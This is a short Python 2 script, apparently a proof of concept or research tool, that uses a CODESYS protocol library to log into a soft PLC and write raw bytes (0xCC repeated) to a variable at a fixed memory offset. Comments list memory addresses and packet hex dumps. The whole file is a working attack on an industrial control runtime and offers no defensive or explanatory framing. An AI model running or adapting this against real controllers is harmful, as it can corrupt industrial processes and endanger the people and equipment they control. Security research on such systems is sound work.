#! /usr/bin/env python2
from lib.pycodesys import *
import pickle, os, struct, time, traceback

SAVEDSTATE_F='/tmp/cds.sav'

cds = None



#######
# 00 00 09 00 00 00 43 43 43 43 43 43 43 43 00 1b 00 15 0c 00 02 f8 35 06 00 17 0c 09 04 1b 06 00 01 00 00 17 04 09 04 17 08 09 04 04


# 00 00 22 00 00 00 44 00 44 00 44 00 44 00 44 00 44 00 44 00 44 00 44 00 44 00 44 00 44 00 44 00 44 00 44 00 44 00 00 00 1b 00 15 0c 00 02 4a 36 06 00 17 0c 09 04 1b 06 00 01 00 00 17 04 09 04 17 08 09 04 04 00 00 00

# var03 is at 0xF78DC64A
# area0 0xF78D9000
# area3 0xF77D9000


cds = CodesysNode(host='softplc', port=11740, verbose=True)
chan_id = cds.connect()


try:
    cds.loginToDevice()

    cds.loginToApp()


    varlist = [
        VMeta(name='var03', type=0x10, offset=0x364a),
    ]
    random_value = "\xCC" * 6

    print('** GONNA WRITE: HEX: %s TO OFFSET: %s' % (random_value.encode('hex'),  hex(varlist[0].offset)))


    cds.read_variables(varlist)
    cds.write_variables(varlist, values=[random_value], is_raw_bytestr=True)
    cds.read_variables(varlist)

except Exception as e:
    traceback.print_exc()
    cds.disconnect()



cds.disconnect()



